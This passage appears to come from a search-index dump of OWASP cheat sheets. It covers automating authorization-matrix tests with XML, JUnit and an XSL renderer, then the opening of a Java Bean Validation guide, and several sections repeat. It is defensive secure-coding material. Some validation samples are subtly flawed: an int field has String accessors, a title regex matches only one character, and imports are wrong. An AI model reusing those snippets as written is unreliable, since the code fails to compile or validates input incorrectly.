CreateMessage ' when called with POV ' ANONYMOUS ' return a response code 200 that is not the expected one ( 403 expected ). testAccessUsingBasicUserPointOfView ( org . owasp . pocauthztesting . AuthorizationMatrixIT ) Time elapsed : 0.05 s ### FAILURE ! java . lang . AssertionError : Access issues detected using the BASIC USER point of view : The service ' DeleteMessage ' when called with POV ' BASIC ' return a response code 200 that is not the expected one ( 403 expected ). Rendering of the authorization matrix for audit / review \u00b6 Even if the authorization matrix is stored in a human readable format (XML), it can be interesting to provide an on-the-fly rendering representation of the XML file in order to facilitate the review, audit and discussion about the authorization matrix in order to spot potential inconsistencies. The Following XSL stylesheet can be used: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <xsl:stylesheet xmlns:xsl= \"http://www.w3.org/1999/XSL/Transform\" version= \"1.0\" > <xsl:template match= \"/\" > <html> <head> <title> Authorization Matrix </title> <link rel= \"stylesheet\" href= \"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css\" integrity= \"sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ\" crossorigin= \"anonymous\" /> </head> <body> <h3> Roles </h3> <ul> <xsl:for-each select= \"authorization-matrix/roles/role\" > <xsl:choose > <xsl:when test= \"@name = 'ADMIN'\" > <div class= \"alert alert-warning\" role= \"alert\" > <strong> <xsl:value-of select= \"@name\" /> </strong> : <xsl:value-of select= \"@description\" /> </div> </xsl:when> <xsl:when test= \"@name = 'BASIC'\" > <div class= \"alert alert-info\" role= \"alert\" > <strong> <xsl:value-of select= \"@name\" /> </strong> : <xsl:value-of select= \"@description\" /> </div> </xsl:when> <xsl:otherwise > <div class= \"alert alert-danger\" role= \"alert\" > <strong> <xsl:value-of select= \"@name\" /> </strong> : <xsl:value-of select= \"@description\" /> </div> </xsl:otherwise> </xsl:choose> </xsl:for-each> </ul> <h3> Authorizations </h3> <table class= \"table table-hover table-sm\" > <thead class= \"thead-inverse\" > <tr> <th> Service </th> <th> URI </th> <th> Method </th> <th> Role </th> </tr> </thead> <tbody> <xsl:for-each select= \"authorization-matrix/services/service\" > <xsl:variable name= \"service-name\" select= \"@name\" /> <xsl:variable name= \"service-uri\" select= \"@uri\" /> <xsl:variable name= \"service-method\" select= \"@http-method\" /> <xsl:for-each select= \"role\" > <tr> <td scope= \"row\" > <xsl:value-of select= \"$service-name\" /> </td> <td> <xsl:value-of select= \"$service-uri\" /> </td> <td> <xsl:value-of select= \"$service-method\" /> </td> <td> <xsl:variable name= \"service-role-name\" select= \"@name\" /> <xsl:choose > <xsl:when test= \"@name = 'ADMIN'\" > <div class= \"alert alert-warning\" role= \"alert\" > <xsl:value-of select= \"@name\" /> </div> </xsl:when> <xsl:when test= \"@name = 'BASIC'\" > <div class= \"alert alert-info\" role= \"alert\" > <xsl:value-of select= \"@name\" /> </div> </xsl:when> <xsl:otherwise > <div class= \"alert alert-danger\" role= \"alert\" > <xsl:value-of select= \"@name\" /> </div> </xsl:otherwise> </xsl:choose> </td> </tr> </xsl:for-each> </xsl:for-each> </tbody> </table> </body> </html> </xsl:template> </xsl:stylesheet> Example of the rendering: Sources of the prototype \u00b6 GitHub repository","title":"Authorization Testing Automation"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#authorization-testing-automation","text":"","title":"Authorization Testing Automation"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#introduction","text":"Authorizations definition and implementation is one of the important protection measure of an application. They are defined in the creation phase of the project and, even if authorization issues are found when the application is initially released and submitted to a security audit before to go live, the most significant number of issues related to authorization came in the maintenance lifetime of the application. This situation is often explained by the fact that features are added/modified and no review of the authorizations was performed on the application before the publishing of the new release, for cost or time issue reason.","title":"Introduction"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#context","text":"In order to try to address this situation, it's can be interesting to automate the evaluation of the authorizations definition and implementation on the application. This, to constantly ensure that implementation of the authorizations in the application is consistent with the authorizations definition. An authorization is often composed by 2 elements (also named dimensions): The Feature and the Logical Role that can access it (sometime a third dimension named Data is added in order to define a access that include a filtering at business data level). The representation of the different combinations of these 2 dimensions is often named an Authorization matrix and is often formalized in an Microsoft Excel file. During a test of an authorization, a Logical Role is also called a Point Of View .","title":"Context"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#objective","text":"This article describe a proposition of implementation in order to automate the tests of an authorization matrix . This article use the assumption that 2 dimensions are used to represents an authorization for the technical proposition described and take as example a application exposing REST services. The objective is to provide starting ideas/hints in order to create a tailored way of testing of the authorization matrix for the target application.","title":"Objective"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#proposition","text":"In order to achieve the full automation of the evaluation of the authorization matrix , the following actions has been performed: Formalize the authorization matrix in a pivot format file allowing: The processing by a program in a easy way. To be read and updated by a human for the follow-up of the authorization combinations. Hierarchy in the information in order to easily materialize the different combinations. The maximum possible of independence from the technology and design used to implements the application exposing the features. Create a set of integration tests that fully use the authorization matrix pivot file as input source in order to evaluate the different combinations with: The minimum possible of maintenance when the authorization matrix pivot file is updated. A clear indication, in case of failed test, of the source authorization combination that do not respect the authorization matrix.","title":"Proposition"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#authorization-matrix-pivot-file","text":"The XML format has been used to formalize the authorization matrix. The XML structure contains 3 main sections: Node roles : This node describe the possible logical roles used in the system, is used to provide a list and the explanation of the different roles (authorization level). Node services : This node list and describe the available services exposed by the system and the associated logical role(s) that can call them. Node services-testing : This node provide a test payload for each service if the service use input data other than coming from URL or path. This is an example of the XML used to represents the authorization: Placeholders (values between {}) are used to mark location where test value must be placed by the integration tests if needed <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!-- This file materialize the authorization matrix for the different services exposed by the system. It will be used by the tests as a input sources for the different tests cases: 1) Evaluate legitimate access and is correct implementation 2) Identify not legitimate access (authorization definition issue on service implementation) The \"name\" attribute is used for identify uniquely a SERVICE or a ROLE. --> <authorization-matrix> <!-- Describe the possible logical roles used in the system, is used here to provide a list+explanation of the different roles (authorization level) --> <roles> <role name= \"ANONYMOUS\" description= \"Indicate that no authorization is needed\" /> <role name= \"BASIC\" description= \"Role affected to a standard user (lowest access right just above anonymous)\" /> <role name= \"ADMIN\" description= \"Role affected to a administrator user (highest access right)\" /> </roles> <!-- List and describe the available services exposed by the system and the associated logical role(s) that can call them --> <services> <service name= \"ReadSingleMessage\" uri= \"/{messageId}\" http-method= \"GET\" http-response-code-for-access-allowed= \"200\" http-response-code-for-access-denied= \"403\" > <role name= \"ANONYMOUS\" /> <role name= \"BASIC\" /> <role name= \"ADMIN\" /> </service> <service name= \"ReadAllMessages\" uri= \"/\" http-method= \"GET\" http-response-code-for-access-allowed= \"200\" http-response-code-for-access-denied= \"403\" > <role name= \"ANONYMOUS\" /> <role name= \"BASIC\" /> <role name= \"ADMIN\" /> </service> <service name= \"CreateMessage\" uri= \"/\" http-method= \"PUT\" http-response-code-for-access-allowed= \"200\" http-response-code-for-access-denied= \"403\" > <role name= \"BASIC\" /> <role name= \"ADMIN\" /> </service> <service name= \"DeleteMessage\" uri= \"/{messageId}\" http-method= \"DELETE\" http-response-code-for-access-allowed= \"200\" http-response-code-for-access-denied= \"403\" > <role name= \"ADMIN\" /> </service> </services> <!-- Provide a test payload for each service if needed --> <services-testing> <service name= \"ReadSingleMessage\" > <payload/> </service> <service name= \"ReadAllMessages\" > <payload/> </service> <service name= \"CreateMessage\" > <payload content-type= \"application/json\" > {\"content\":\"test\"} </payload> </service> <service name= \"DeleteMessage\" > <payload/> </service> </services-testing> </authorization-matrix>","title":"Authorization matrix pivot file"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#integration-tests","text":"Integration tests are implemented using a maximum of factorized code and one test case by Point Of View (POV) has been created in order to group the verifications by profile of access level (logical role) and facilitate the rendering/identification of the errors. Parsing, object mapping and access to the authorization matrix information has been implemented using XML marshalling/unmarshalling built-in features provided by the technology used to implements the tests (JAXB here) in order to limit the code to the one in charge of performing the tests. This the implementation of the integration tests case class: import org.owasp.pocauthztesting.enumeration.SecurityRole ; import org.owasp.pocauthztesting.service.AuthService ; import org.owasp.pocauthztesting.vo.AuthorizationMatrix ; import org.apache.http.client.methods.CloseableHttpResponse ; import org.apache.http.client.methods.HttpDelete ; import org.apache.http.client.methods.HttpGet ; import org.apache.http.client.methods.HttpPut ; import org.apache.http.client.methods.HttpRequestBase ; import org.apache.http.entity.StringEntity ; import org.apache.http.impl.client.CloseableHttpClient ; import org.apache.http.impl.client.HttpClients ; import org.junit.Assert ; import org.junit.BeforeClass ; import org.junit.Test ; import org.xml.sax.InputSource ; import javax.xml.bind.JAXBContext ; import javax.xml.parsers.SAXParserFactory ; import javax.xml.transform.Source ; import javax.xml.transform.sax.SAXSource ; import java.io.File ; import java.io.FileInputStream ; import java.util.ArrayList ; import java.util.List ; import java.util.Optional ; /** * Integration Test cases in charge of validate the correct implementation of the authorization matrix. * Create on test case by logical role that will test access on all services exposed by the system. * Implements here focus on readability */ public class AuthorizationMatrixIT { /** * Object representation of the authorization matrix */ private static AuthorizationMatrix AUTHZ_MATRIX ; private static final String BASE_URL = \"http://localhost:8080\" ; /** * Load the authorization matrix in objects tree * * @throws Exception If any error occurs */ @BeforeClass public static void globalInit () throws Exception { try ( FileInputStream fis = new FileInputStream ( new File ( \"authorization-matrix.xml\" ))) { SAXParserFactory spf = SAXParserFactory . newInstance (); spf . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); spf . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); spf . setFeature ( \"http://apache.org/xml/features/nonvalidating/load-external-dtd\" , false ); Source xmlSource = new SAXSource ( spf . newSAXParser (). getXMLReader (), new InputSource ( fis )); JAXBContext jc = JAXBContext . newInstance ( AuthorizationMatrix . class ); AUTHZ_MATRIX = ( AuthorizationMatrix ) jc . createUnmarshaller (). unmarshal ( xmlSource ); } } /** * Test access to the services from a anonymous user. * * @throws Exception */ @Test public void testAccessUsingAnonymousUserPointOfView () throws Exception { //Run the tests - No access token here List < String > errors = executeTestWithPointOfView ( SecurityRole . ANONYMOUS , null ); //Verify the test results Assert . assertEquals ( \"Access issues detected using the ANONYMOUS USER point of view:\\n\" + formatErrorsList ( errors ), 0 , errors . size ()); } /** * Test access to the services from a basic user. * * @throws Exception */ @Test public void testAccessUsingBasicUserPointOfView () throws Exception { //Get access token representing the authorization for the associated point of view String accessToken = generateTestCaseAccessToken ( \"basic\" , SecurityRole . BASIC ); //Run the tests List < String > errors = executeTestWithPointOfView ( SecurityRole . BASIC , accessToken ); //Verify the test results Assert . assertEquals ( \"Access issues detected using the BASIC USER point of view:\\n \" + formatErrorsList ( errors ), 0 , errors . size ()); } /** * Test access to the services from a administrator user. * * @throws Exception */ @Test public void testAccessUsingAdministratorUserPointOfView () throws Exception { //Get access token representing the authorization for the associated point of view String accessToken = generateTestCaseAccessToken ( \"admin\" , SecurityRole . ADMIN ); //Run the tests List < String > errors = executeTestWithPointOfView ( SecurityRole . ADMIN , accessToken ); //Verify the test results Assert . assertEquals ( \"Access issues detected using the ADMIN USER point of view:\\n\" + formatErrorsList ( errors ), 0 , errors . size ()); } /** * Evaluate the access to all service using the point of view (POV) specified. * * @param pointOfView Point of view to use * @param accessToken Access token that is linked to the point of view in terms of authorization. * @return List of errors detected * @throws Exception If any error occurs */ private List < String > executeTestWithPointOfView ( SecurityRole pointOfView , String accessToken ) throws Exception { List < String > errors = new ArrayList <> (); String errorMessageTplForUnexpectedReturnCode = \"The service '%s' when called with POV '%s' return a response code %s that is not the expected one in allowed or denied case.\" ; String errorMessageTplForIncorrectReturnCode = \"The service '%s' when called with POV '%s' return a response code %s that is not the expected one (%s expected).\" ; String fatalErrorMessageTpl = \"The service '%s' when called with POV %s meet the error: %s\" ; //Get the list of services to call List < AuthorizationMatrix . Services . Service > services = AUTHZ_MATRIX . getServices (). getService (); //Get the list of services test payload to use List < AuthorizationMatrix . ServicesTesting . Service > servicesTestPayload = AUTHZ_MATRIX . getServicesTesting (). getService (); //Call all services sequentially (no special focus on performance here) services . forEach ( service -> { //Get the service test payload for the current service String payload = null ; String payloadContentType = null ; Optional < AuthorizationMatrix . ServicesTesting . Service > serviceTesting = servicesTestPayload . stream (). filter ( srvPld -> srvPld . getName (). equals ( service . getName ())). findFirst (); if ( serviceTesting . isPresent ()) { payload = serviceTesting . get (). getPayload (). getValue (); payloadContentType = serviceTesting . get (). getPayload (). getContentType (); } //Call the service and verify if the response is consistent try { //Call the service int serviceResponseCode = callService ( service . getUri (), payload , payloadContentType , service . getHttpMethod (), accessToken ); //Check if the role represented by the specified point of view is defined for the current service Optional < AuthorizationMatrix . Services . Service . Role > role = service . getRole (). stream (). filter ( r -> r . getName (). equals ( pointOfView . name ())). findFirst (); boolean accessIsGrantedInAuthorizationMatrix = role . isPresent (); //Verify behavior consistency according to the response code returned and the authorization configured in the matrix if ( serviceResponseCode == service . getHttpResponseCodeForAccessAllowed ()) { //Roles is not in the list of role allowed to access to the service so it's an error if ( ! accessIsGrantedInAuthorizationMatrix ) { errors . add ( String . format ( errorMessageTplForIncorrectReturnCode , service . getName (), pointOfView . name (), serviceResponseCode , service . getHttpResponseCodeForAccessDenied ())); } } else if ( serviceResponseCode == service . getHttpResponseCodeForAccessDenied ()) { //Roles is in the list of role allowed to access to the service so it's an error if ( accessIsGrantedInAuthorizationMatrix ) { errors . add ( String . format ( errorMessageTplForIncorrectReturnCode , service . getName (), pointOfView . name (), serviceResponseCode , service . getHttpResponseCodeForAccessAllowed ())); } } else { errors . add ( String . format ( errorMessageTplForUnexpectedReturnCode , service . getName (), pointOfView . name (), serviceResponseCode )); } } catch ( Exception e ) { errors . add ( String . format ( fatalErrorMessageTpl , service . getName (), pointOfView . name (), e . getMessage ())); } }); return errors ; } /** * Call a service with a specific payload and return the HTTP response code received. * Delegate this step in order to made the test cases more easy to maintain. * * @param uri URI of the target service * @param payloadContentType Content type of the payload to send * @param payload Payload to send * @param httpMethod HTTP method to use * @param accessToken Access token to specify to represent the identity of the caller * @return The HTTP response code received * @throws Exception If any error occurs */ private int callService ( String uri , String payload , String payloadContentType , String httpMethod , String accessToken ) throws Exception { int rc ; //Build the request - Use Apache HTTP Client in order to be more flexible in the combination HttpRequestBase request ; String url = ( BASE_URL + uri ). replaceAll ( \"\\\\{messageId\\\\}\" , \"1\" ); switch ( httpMethod ) { case \"GET\" : request = new HttpGet ( url ); break ; case \"DELETE\" : request = new HttpDelete ( url ); break ; case \"PUT\" : request = new HttpPut ( url ); if ( payload != null ) { request . setHeader ( \"Content-Type\" , payloadContentType ); (( HttpPut ) request ). setEntity ( new StringEntity ( payload . trim ())); } break ; default : throw new UnsupportedOperationException ( httpMethod + \" not supported !\" ); } request . setHeader ( \"Authorization\" , ( accessToken != null ) ? accessToken : \"\" ); //Send the request and get the HTTP response code try ( CloseableHttpClient httpClient = HttpClients . createDefault ()) { try ( CloseableHttpResponse httpResponse = httpClient . execute ( request )) { //Don't care here about the response content... rc = httpResponse . getStatusLine (). getStatusCode (); } } return rc ; } /** * Generate a JWT token the user and role specified. * * @param login User login * @param role Authorization logical role * @return The JWT token * @throws Exception If any error occurs during the creation */ private String generateTestCaseAccessToken ( String login , SecurityRole role ) throws Exception { return new AuthService (). issueAccessToken ( login , role ); } /** * Format a list of errors to a printable string * * @param errors Error list * @return Printable string */ private String formatErrorsList ( List < String > errors ) { StringBuilder buffer = new StringBuilder (); errors . forEach ( e -> buffer . append ( e ). append ( \"\\n\" )); return buffer . toString (); } } In case of detection of a authorization issue(s) the output is the following: testAccessUsingAnonymousUserPointOfView ( org . owasp . pocauthztesting . AuthorizationMatrixIT ) Time elapsed : 1.009 s ### FAILURE java . lang . AssertionError : Access issues detected using the ANONYMOUS USER point of view : The service ' DeleteMessage ' when called with POV ' ANONYMOUS ' return a response code 200 that is not the expected one ( 403 expected ). The service ' CreateMessage ' when called with POV ' ANONYMOUS ' return a response code 200 that is not the expected one ( 403 expected ). testAccessUsingBasicUserPointOfView ( org . owasp . pocauthztesting . AuthorizationMatrixIT ) Time elapsed : 0.05 s ### FAILURE ! java . lang . AssertionError : Access issues detected using the BASIC USER point of view : The service ' DeleteMessage ' when called with POV ' BASIC ' return a response code 200 that is not the expected one ( 403 expected ).","title":"Integration tests"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#rendering-of-the-authorization-matrix-for-audit-review","text":"Even if the authorization matrix is stored in a human readable format (XML), it can be interesting to provide an on-the-fly rendering representation of the XML file in order to facilitate the review, audit and discussion about the authorization matrix in order to spot potential inconsistencies. The Following XSL stylesheet can be used: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <xsl:stylesheet xmlns:xsl= \"http://www.w3.org/1999/XSL/Transform\" version= \"1.0\" > <xsl:template match= \"/\" > <html> <head> <title> Authorization Matrix </title> <link rel= \"stylesheet\" href= \"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css\" integrity= \"sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ\" crossorigin= \"anonymous\" /> </head> <body> <h3> Roles </h3> <ul> <xsl:for-each select= \"authorization-matrix/roles/role\" > <xsl:choose > <xsl:when test= \"@name = 'ADMIN'\" > <div class= \"alert alert-warning\" role= \"alert\" > <strong> <xsl:value-of select= \"@name\" /> </strong> : <xsl:value-of select= \"@description\" /> </div> </xsl:when> <xsl:when test= \"@name = 'BASIC'\" > <div class= \"alert alert-info\" role= \"alert\" > <strong> <xsl:value-of select= \"@name\" /> </strong> : <xsl:value-of select= \"@description\" /> </div> </xsl:when> <xsl:otherwise > <div class= \"alert alert-danger\" role= \"alert\" > <strong> <xsl:value-of select= \"@name\" /> </strong> : <xsl:value-of select= \"@description\" /> </div> </xsl:otherwise> </xsl:choose> </xsl:for-each> </ul> <h3> Authorizations </h3> <table class= \"table table-hover table-sm\" > <thead class= \"thead-inverse\" > <tr> <th> Service </th> <th> URI </th> <th> Method </th> <th> Role </th> </tr> </thead> <tbody> <xsl:for-each select= \"authorization-matrix/services/service\" > <xsl:variable name= \"service-name\" select= \"@name\" /> <xsl:variable name= \"service-uri\" select= \"@uri\" /> <xsl:variable name= \"service-method\" select= \"@http-method\" /> <xsl:for-each select= \"role\" > <tr> <td scope= \"row\" > <xsl:value-of select= \"$service-name\" /> </td> <td> <xsl:value-of select= \"$service-uri\" /> </td> <td> <xsl:value-of select= \"$service-method\" /> </td> <td> <xsl:variable name= \"service-role-name\" select= \"@name\" /> <xsl:choose > <xsl:when test= \"@name = 'ADMIN'\" > <div class= \"alert alert-warning\" role= \"alert\" > <xsl:value-of select= \"@name\" /> </div> </xsl:when> <xsl:when test= \"@name = 'BASIC'\" > <div class= \"alert alert-info\" role= \"alert\" > <xsl:value-of select= \"@name\" /> </div> </xsl:when> <xsl:otherwise > <div class= \"alert alert-danger\" role= \"alert\" > <xsl:value-of select= \"@name\" /> </div> </xsl:otherwise> </xsl:choose> </td> </tr> </xsl:for-each> </xsl:for-each> </tbody> </table> </body> </html> </xsl:template> </xsl:stylesheet> Example of the rendering:","title":"Rendering of the authorization matrix for audit / review"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html#sources-of-the-prototype","text":"GitHub repository","title":"Sources of the prototype"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html","text":"Bean Validation Cheat Sheet \u00b6 Introduction \u00b6 This article is focused on providing clear, simple, actionable guidance for providing Java Bean Validation security functionality in your applications. Bean validation (JSR303 aka Bean Validation 1.0 /JSR349 aka Bean Validation 1.1 ) is one of the most common ways to perform input validation in Java. It is an application layer agnostic validation spec which provides the developer with the means to define a set of validation constraints on a domain model and then perform validation of those constraints through out the various application tiers. One advantage of this approach is that the validation constraints and the corresponding validators are only written once, thus reducing duplication of effort and ensuring uniformity: Typical Validation \u00b6 Bean Validation \u00b6 Setup \u00b6 The examples in this guide use Hibernate Validator (the reference implementation for Bean Validation 1.1). Add Hibernate Validator to your pom.xml : <dependency> <groupId> org.hibernate </groupId> <artifactId> hibernate-validator </artifactId> <version> 5.2.4.Final </version> </dependency> Enable bean validation support in Spring's context.xml : <beans:beans ... ... <mvc:annotation-driven /> ... </beans:beans> For more info, please see the setup guide Basics \u00b6 In order to get started using Bean Validation, you must add validation constraints ( @Pattern , @Digits , @Min , @Max , @Size , @Past , @Future , @CreditCardNumber , @Email , @URL , etc.) to your model and then utilize the @Valid annotation when passing your model around in various application layers. Constraints can be applied in several places: Fields Properties Classes For Bean Validation 1.1 also on: Parameters Return values Constructors For the sake of simplicity all the examples below feature field constraints and all validation is triggered by the controller. Refer to the Bean Validation documentation for a full list of examples. When it comes to error handling, the Hibernate Validator returns a BindingResult object which contains a List<ObjectError> . The examples below feature simplistic error handling, while a production ready application would have a more elaborate design that takes care of logging and error page redirection. Predefined Constraints \u00b6 @Pattern \u00b6 Annotation : @Pattern(regex=,flag=) Data Type : CharSequence Use : Checks if the annotated string matches the regular expression regex considering the given flag match. Please visit OWASP Validation Regex Repository for other useful regex's. Reference : Documentation Model : import org.hibernate.validator.constraints.Pattern ; public class Article { //Constraint: Alpha Numeric article titles only using a regular expression @Pattern ( regexp = \"[a-zA-Z0-9 ]\" ) private String articleTitle ; public String getArticleTitle () { return articleTitle ; } public void setArticleTitle ( String articleTitle ) { this . articleTitle = articleTitle ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.Article ; @Controller public class ArticleController { ... @RequestMapping ( value = \"/postArticle\" , method = RequestMethod . POST ) public @ResponseBody String postArticle ( @Valid Article article , BindingResult result , HttpServletResponse response ) { if ( result . hasErrors ()) { String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ) { errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } } @Digits \u00b6 Annotation : @Digits(integer=,fraction=) Data Type : BigDecimal , BigInteger , CharSequence , byte , short , int , long and the respective wrappers of the primitive types; Additionally supported by HV: any sub-type of Number Use : Checks whether the annotated value is a number having up to integer digits and fraction fractional digits Reference : Documentation Model : import org.hibernate.validator.constraints.Digits ; public class Customer { //Constraint: Age can only be 3 digits long or less @Digits ( integer = 3 , fraction = 0 ) private int age ; public String getAge () { return age ; } public void setAge ( String age ) { this . age = age ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.Customer ; @Controller public class CustomerController { ... @RequestMapping ( value = \"/registerCustomer\" , method = RequestMethod . POST ) public @ResponseBody String registerCustomer ( @Valid Customer customer , BindingResult result , HttpServletResponse response ) { if ( result . hasErrors ()) { String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ) { errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } } @Size \u00b6 Annotation : @Size(min=, max=) Data Type : CharSequence , Collection , Map and Arrays Use : Checks if the annotated element's size is between min and max (inclusive) Reference : Documentation Model : import org.hibernate.validator.constraints.Size ; public class Message { //Constraint: Message must be at least 10 characters long, but less than 500 @Size ( min = 10 , max = 500 ) private String message ; public String getMessage () { return message ; } public void setMessage ( String message ) { this . message = message ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.Message ; @Controller public class MessageController { ... @RequestMapping ( value = \"/sendMessage\" , method = RequestMethod . POST ) public @ResponseBody String sendMessage ( @Valid Message message , BindingResult result , HttpServletResponse response ){ if ( result . hasErrors ()){ String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ){ errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } } @Past / @Future \u00b6 Annotation : @Past, @Future Data Type : java.util.Date , java.util.Calendar , java.time.chrono.ChronoZonedDateTime , java.time.Instant , java.time.OffsetDateTime Use : Checks whether the annotated date is in the past / future Reference : Documentation Model : import org.hibernate.validator.constraints.Past ; import org.hibernate.validator.constraints.Future ; public class DoctorVisit { //Constraint: Birthdate must be in the past @Past private Date birthDate ; public Date getBirthDate () { return birthDate ; } public void setBirthDate ( Date birthDate ) { this . birthDate = birthDate ; } //Constraint: Schedule visit date must be in the future @Future private String scheduledVisitDate ; public String getScheduledVisitDate () { return scheduledVisitDate ; } public void setScheduledVisitDate ( String scheduledVisitDate ) { this . scheduledVisitDate = scheduledVisitDate ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.DoctorVisit ; @Controller public class DoctorVisitController { ... @RequestMapping ( value = \"/scheduleVisit\" , method = RequestMethod . POST ) public @ResponseBody String scheduleVisit ( @Valid DoctorVisit doctorvisit , BindingResult result , HttpServletResponse response ){ if ( result . hasErrors ()){ String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ){ errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } } Combining Constraints \u00b6 Validation annotations can be combined in any suitable way. For instance, to specify a valid reviewRating value between 1 and 5, specify the validation like this : Annotation : @Min(value=), @Max(value=) Data Type : BigDecimal , BigInteger , byte , short , int , long and the respective wrappers of the primitive types; Additionally supported by HV: any sub-type of CharSequence (the numeric value represented by the character sequence is evaluated), any sub-type of Number Use : Checks whether the annotated value is higher/lower than or equal to the specified minimum Reference: Documentation Model : import org.hibernate.validator.constraints.Min ; import org.hibernate.validator.constraints.Max ; public class Review { //Constraint: Review rating must be between 1 and 5 @Min ( 1 ) @Max ( 5 ) private int reviewRating ; public int getReviewRating () { return reviewRating ; } public void setReviewRating ( int reviewRating ) { this . reviewRating = reviewRating ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.ReviewRating ; @Controller public class ReviewController { ... @RequestMapping ( value = \"/postReview\" , method = RequestMethod . POST ) public @ResponseBody String postReview ( @Valid Review review , BindingResult result , HttpServletResponse response ){ if ( result . hasErrors ()){ String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ){ errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } } Cascading Constraints \u00b6 Validating one bean is a good start, but often, beans are nested or in a complete graph of beans. To validate that graph in one go, apply cascading validation with @Valid Additional Constraints \u00b6 In addition to providing the complete set of JSR303 constraints, Hibernate Validator also defines some additional constraints for convenience: @CreditCardNumber @EAN @Email @Length @Range @SafeHtml @ScriptAssert @URL Take a look at this table for the complete list. Custom Constraints \u00b6 One of the most powerful features of bean validation is the ability to define your own constraints that go beyond the simple validation offered by built-in constraints. Creating custom constraints is beyond the scope of this guide. Please see this documentation . Error Messages \u00b6 It is possible to specify a message ID with the validation annotation, so that error messages are customized : @Pattern ( regexp = \"[a-zA-Z0-9 ]\" , message = \"article.title.error\" ) private String articleTitle ; Spring MVC will then look up a message with ID article.title.error in a defined MessageSource. More on this documentation .","title":"Bean Validation"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#bean-validation-cheat-sheet","text":"","title":"Bean Validation Cheat Sheet"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#introduction","text":"This article is focused on providing clear, simple, actionable guidance for providing Java Bean Validation security functionality in your applications. Bean validation (JSR303 aka Bean Validation 1.0 /JSR349 aka Bean Validation 1.1 ) is one of the most common ways to perform input validation in Java. It is an application layer agnostic validation spec which provides the developer with the means to define a set of validation constraints on a domain model and then perform validation of those constraints through out the various application tiers. One advantage of this approach is that the validation constraints and the corresponding validators are only written once, thus reducing duplication of effort and ensuring uniformity:","title":"Introduction"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#typical-validation","text":"","title":"Typical Validation"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#bean-validation","text":"","title":"Bean Validation"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#setup","text":"The examples in this guide use Hibernate Validator (the reference implementation for Bean Validation 1.1). Add Hibernate Validator to your pom.xml : <dependency> <groupId> org.hibernate </groupId> <artifactId> hibernate-validator </artifactId> <version> 5.2.4.Final </version> </dependency> Enable bean validation support in Spring's context.xml : <beans:beans ... ... <mvc:annotation-driven /> ... </beans:beans> For more info, please see the setup guide","title":"Setup"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#basics","text":"In order to get started using Bean Validation, you must add validation constraints ( @Pattern , @Digits , @Min , @Max , @Size , @Past , @Future , @CreditCardNumber , @Email , @URL , etc.) to your model and then utilize the @Valid annotation when passing your model around in various application layers. Constraints can be applied in several places: Fields Properties Classes For Bean Validation 1.1 also on: Parameters Return values Constructors For the sake of simplicity all the examples below feature field constraints and all validation is triggered by the controller. Refer to the Bean Validation documentation for a full list of examples. When it comes to error handling, the Hibernate Validator returns a BindingResult object which contains a List<ObjectError> . The examples below feature simplistic error handling, while a production ready application would have a more elaborate design that takes care of logging and error page redirection.","title":"Basics"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#predefined-constraints","text":"","title":"Predefined Constraints"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#pattern","text":"Annotation : @Pattern(regex=,flag=) Data Type : CharSequence Use : Checks if the annotated string matches the regular expression regex considering the given flag match. Please visit OWASP Validation Regex Repository for other useful regex's. Reference : Documentation Model : import 